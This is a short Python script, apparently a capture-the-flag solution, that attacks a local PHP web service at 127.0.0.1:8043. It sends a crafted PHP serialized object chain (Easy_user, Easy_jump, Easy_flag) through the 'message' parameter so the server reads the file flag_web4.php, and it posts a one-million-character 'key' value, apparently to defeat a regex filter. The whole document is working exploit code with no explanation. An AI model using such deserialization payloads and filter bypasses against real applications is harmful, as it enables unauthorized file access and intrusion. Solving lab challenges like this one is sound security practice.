import requests

url = 'http://127.0.0.1:8043/?message=O:9:"Easy_user":2:{s:4:"item";s:5:"hello";s:7:"message";O:9:"Easy_jump":2:{s:1:"n";a:0:{}s:3:"str";O:9:"Easy_flag":2:{s:6:"string";N;s:6:"params";a:1:{s:7:"message";s:13:"flag_web4.php";}}}}'
re = requests.post(url,data={"key" : "a"*1000000})
print(re.text)
